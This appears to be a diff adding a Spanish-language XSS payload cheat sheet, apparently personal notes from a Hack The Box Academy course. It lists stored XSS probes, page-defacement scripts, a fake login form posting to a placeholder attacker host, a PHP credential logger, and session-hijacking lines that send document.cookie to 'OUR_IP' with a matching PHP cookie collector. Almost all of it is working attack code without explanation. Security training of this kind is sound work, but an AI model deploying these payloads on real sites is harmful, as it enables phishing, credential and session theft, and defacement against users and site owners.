@@ -1,0 +1,65 @@
+	#### Payloads XSS
+Payloads sin explicacion dee XSS.txt. Mas info en ese txt
+
+## Stored
+<script>alert(window.origin)</script>
+<script>print()</script>
+<script>alert(document.cookie)</script>
+<img src="" onerror=alert(window.origin)>
+
+## Funciones objetos DOM
+document.write()
+DOM.innerHTML
+DOM.outerHTML
+
+## Funciones DOM
+add()
+after()
+append()
+
+## Defacing
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://i.imgur.com/lzwrGiH.jpeg"</script>
+<script>document.title = 'Nuevo titulo'</script>
+document.getElementById("todo").innerHTML = "New Text"
+document.getElementsByTagName('body')[0].innerHTML = "New Text"
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+
+## Phishing
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+	<input type="username" name="username" placeholder="Username">
+	<input type="password" name="password" placeholder="Password">
+	<input type="submit" name="submit" value="Login">
+</form>
+
+document.getElementById('<urlform>').remove();
+
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+	$file = fopen("creds.txt", "a+");
+	fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+     	header("Location: http://SERVER_IP/index.php");
+    	fclose($file);
+   	exit();
+}?>
+<html>
+<body><h1>Hello Friend</h1></body>
+</html>
+
+## Session hhijacking
+<script src=http://OUR_IP/<custom.name>></script>
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
